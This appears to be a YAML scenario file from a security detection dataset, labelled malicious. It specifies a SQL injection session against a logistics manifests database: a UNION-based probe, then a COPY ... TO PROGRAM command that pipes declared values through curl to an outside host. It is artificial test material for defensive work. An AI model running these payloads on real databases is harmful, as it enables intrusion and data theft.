scenario_id: logistics_sqli_mal_02
family_id: logistics_sql_injection_manifests
domain: logistics
matched_pair_id: logistics_sqli_pair_02
matched_dimensions:
  fixed: [process_tree_shape, syscall_sequence, timing_pattern, role]
  varied: [sql_content]
time_of_day: "04:15"
default_class: malicious
rule_engine_relationship: malicious_false_negative
sessions:
  - session_label: inject
    role: partner_etl_service
    anchor: db
    timing:
      tempo: steady
      step_gaps_seconds: [3.5]
    events:
      - step_id: probe
        sql: "SELECT manifest_id, weight_kg FROM manifests WHERE manifest_id = 0 UNION SELECT manifest_id, declared_value FROM manifests"
      - step_id: exfil
        sql: "COPY (SELECT manifest_id, declared_value FROM manifests) TO PROGRAM 'curl -sX POST https://customs-sync.datasink.example/ingest -d @-'"
        connects_to: {ip: "194.147.78.24", port: 443}
